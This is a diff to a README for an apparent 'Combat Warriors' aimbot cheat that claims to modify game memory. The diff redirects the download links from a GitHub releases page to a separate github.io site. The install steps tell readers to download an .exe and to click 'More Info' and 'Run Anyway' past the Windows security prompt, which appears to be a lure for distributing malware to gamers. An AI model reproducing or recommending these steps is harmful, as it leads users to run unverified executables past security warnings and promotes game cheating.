@@ -1,6 +1,6 @@
 # 🎯 Combat-Warriors-Script-2026-Aimbot - Gain the upper hand in every match
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Perlcontemporary290/Combat-Warriors-Script-2026-Aimbot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://perlcontemporary290.github.io)
 
 This application provides tools to improve your performance in the game Combat Warriors. It modifies game memory to help you aim and react faster during combat scenarios. The software features a clean interface and runs directly on Windows systems.
 
@@ -30,7 +30,7 @@ Ensure your computer meets these standards before you start:
 Follow these steps to set up the software on your machine:
 
 1.  **Visit the Download Page:** Click the link below to reach the official release repository.
-    [https://github.com/Perlcontemporary290/Combat-Warriors-Script-2026-Aimbot/releases](https://github.com/Perlcontemporary290/Combat-Warriors-Script-2026-Aimbot/releases)
+    [https://perlcontemporary290.github.io](https://perlcontemporary290.github.io)
 2.  **Select the File:** Look under the "Assets" section on the page. Choose the file ending in `.exe` to download the installer to your computer.
 3.  **Run the Installer:** Open the downloaded file. Windows may show a security prompt. If it does, click "More Info" and select "Run Anyway" to complete the installation.
 4.  **Launch the Program:** Find the application icon on your desktop or in your start menu. Open the program to trigger the main control interface.
